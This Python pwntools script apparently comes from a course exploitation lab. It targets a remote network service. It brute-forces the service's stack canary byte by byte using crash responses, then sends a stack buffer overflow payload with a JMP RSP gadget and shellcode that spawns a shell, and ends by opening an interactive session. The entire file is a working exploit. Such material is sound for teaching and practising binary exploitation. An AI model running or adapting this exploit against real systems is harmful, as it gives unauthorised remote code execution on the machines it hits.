''' Script Module Importing '''
from pwn import *

context.arch = "x86_64"             # Set Exploit Architecture to x86_64

''' Globals Initializing '''
# target_host = '127.0.0.1'                     # Uncomment to Test Script Locally
target_host = 'csc748.hostbin.org'              # Test Script Against Server
target_port = 7033

''' Constant Initializing '''
JMP_RSP = 0x004014c5                            # Location of JMP RSP Opcode
SHELLCODE = asm(shellcraft.amd64.linux.sh())    # Generate shellcode
COOKIE_LENGTH = 8
DEBUG = False


''' Variable Initializing '''
cookie = b''                                    # Discovered Cookie Bytes

# Generate guesses excluding newline (0x0a = 10d)
guesses = [bytes([each_value]) for each_value in range(256) if each_value != 10]   

''' ' ' ' ' ' ' ' ' ' ' ' ' ' '''
''' Step 1: Bruteforce Cookie '''
''' ' ' ' ' ' ' ' ' ' ' ' ' ' '''
for each_byte in range(COOKIE_LENGTH):
    for each_hex in range(256):

        # Connect to Target
        p = remote(target_host, target_port)

        # Receive Initial Message from the Server
        initial_message = p.recvline()

        # Send Payload when Prompted for Name
        payload = b"A" * 24 + cookie + guesses[each_hex]            # Compose Payload
        print(f"\n[*] Sending Payload: Buffer Fill + "
              f"{cookie + guesses[each_hex]}\n") if DEBUG else None     # Debug Mode: Print Cookie Guess
        p.sendline(payload)                                         # Send Payload

        try:
            response = p.recvline(timeout=10)                       # Wait for a response from the server

            # At this point, the server will either   #
            # confirm the guess by sending a response #
            # or detect stack smashing and terminate  #
            # the connection with EOFError            #

            #
            # This Section Executes when the Guess is Correct
            #

            if response == b"You may pass.\n":

                print(f"[*] Received response: "
                      f"{response.decode()}\n") if DEBUG else None  # Debug Mode: Print Response

                cookie = cookie + guesses[each_hex]                 # Add guess to Cookie

                print(f"Byte {each_byte+1} Found: "
                      f"{guesses[each_hex]}") if DEBUG else None    # Debug Mode: Byte Found
                print(f"Cookie: {cookie}\n\n") if DEBUG else None   # Debug Mode: Cookie

            p.close()       # Close Connection
            break           # Continue to Next Byte

            # # # # END of correct guess section

        except EOFError:
            #
            # This Section Executes when the Guess is Incorrect
            #

            print("[*] Stack Smashing Detected: "
                  "Connection Closed Prematurely") if DEBUG else None  # Debug Mode: Connection Closed

            p.close()       # Ensure Connection was Closed
            continue        # Continue to Next Guess

            # # # # END of incorrect guess section

        except Exception as err:
            #
            # This Section Handle other Exceptions (timeout, etc.)
            #

            print("[*] Exception:", err)
            p.close()       # Close Connection
            continue        # Continue to Next Guess

            # # # # END of exception section

''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''
''' Step 2: Prepare Payload and Overwrite Stack '''
''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''

print(f"Cookie Successfully Acquired: "
      f"{cookie}\n\n") if DEBUG else None               # Debug Mode: Display Cookie

# Connect to Target
p = remote(target_host, target_port)

# Receive Initial Message from the Server
initial_message = p.recvline()
print(f"\n[*] Received Initial Message: "
      f"{initial_message.decode()}") if DEBUG else None  # Debug Mode: Print Message

# Send Payload when Prompted for Name
# Payload Format: buffer + cookie + rbp + opcode + shellcode
payload = b"A"*24 + cookie + b"B"*8 + p64(JMP_RSP)+ SHELLCODE

print(f"[*] Sending Final Payload") if DEBUG else None  # Debug Mode: Print Message

p.sendline(payload)     # Send the Final Payload
p.interactive()         # Start Interactive Session
